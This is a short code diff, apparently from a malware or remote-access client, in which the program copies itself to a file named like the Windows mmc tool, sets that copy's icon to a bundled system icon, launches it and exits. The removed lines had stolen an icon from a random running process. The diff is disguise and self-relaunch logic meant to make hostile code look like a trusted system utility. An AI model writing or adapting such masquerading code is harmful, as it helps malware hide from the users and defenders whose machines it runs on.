@@ -197,17 +197,11 @@ namespace Client
         {
             if (Armitage.Copy.CopySelfTo(Constants.MMCFile))
             {
+                // change mmc copy icon
+                Utilities.Icon_Util.ChangeIcon(Constants.MMCFile, Properties.Resources.system);
+
                 if (Process.Start(Constants.MMCFile, Constants.MyProcessID.ToString()).Id > 0)
                 {
-                    // attempt to change icon
-                    try
-                    {
-                        var randomnotadminproc = Utilities.Process_Utils.GetRandomRunningProcessThatIsNotAdmin();
-                        string randomsysapp = randomnotadminproc.MainModule.FileName;
-                        var randicon = Utilities.Icon_Util.ExtractIconFromExecutable(randomsysapp);
-                        Utilities.Icon_Util.ChangeIcon(Constants.MMCFile, randicon);
-                    }
-                    catch { }
                     Environment.Exit(0);
                 }
             }
